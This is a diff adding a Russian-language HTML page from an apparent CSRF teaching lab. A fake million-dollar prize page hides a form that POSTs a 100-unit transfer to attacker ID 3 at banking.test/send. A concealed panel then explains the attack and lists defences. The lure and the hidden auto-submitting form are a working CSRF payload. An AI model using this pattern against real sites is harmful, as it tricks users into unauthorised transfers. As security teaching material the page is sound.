@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>БЕСПЛАТНЫЙ ПРИЗ! 🎁</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+<div class="container">
+  <div class="emoji">🎁</div>
+  <h1>ПОЗДРАВЛЯЕМ!</h1>
+  <p class="prize-text">Вы выиграли <strong>$1,000,000</strong>!</p>
+  <p>Нажмите кнопку ниже, чтобы получить свой приз:</p>
+
+  <button class="button" onclick="claimPrize()">
+    ПОЛУЧИТЬ ПРИЗ! 💰
+  </button>
+
+  <div id="warning" class="warning">
+    <h2>⚠️ ЭТО БЫЛА CSRF АТАКА!</h2>
+    <p>Если вы были залогинены в системе платежей, только что произошел несанкционированный перевод денег!</p>
+    <p>Проверьте свой баланс на <a href="https://banking.test" target="_blank">https://banking.test</a></p>
+    <div class="technical-info" style="display: none;">
+      <strong>🔍 Техническая информация об атаке:</strong><br><br>
+      <strong>Что произошло:</strong><br>
+      1. Пользователь посетил "злоумышленническую" страницу<br>
+      2. JavaScript отправил POST запрос с помощью fetch API<br>
+      3. Браузер автоматически добавил session cookie<br>
+      4. Сервер принял запрос, т.к. сессия валидна<br>
+      5. ❌ Отсутствует проверка CSRF токена!<br><br>
+
+      <strong>Отправленные данные:</strong><br>
+      - amount: 100 (сумма перевода)<br>
+      - to_user_id: 3 (ID атакующего)<br><br>
+
+      <strong>Как защититься:</strong><br>
+      ✅ Добавить CSRF токены<br>
+      ✅ Проверять Origin/Referer<br>
+      ✅ Использовать <code>SameSite</code> и <code>Secure</code> cookies<br>
+      ✅ Требовать подтверждение критичных операций
+    </div>
+  </div>
+</div>
+
+<!-- Скрытая форма для CSRF атаки -->
+<form id="csrf-attack-form" action="https://banking.test/send" method="POST" style="display: none;">
+  <input type="hidden" name="amount" value="100">
+  <input type="hidden" name="to_user_id" value="3">
+</form>
+
+<script src="script.js"></script>
+</body>
+</html>
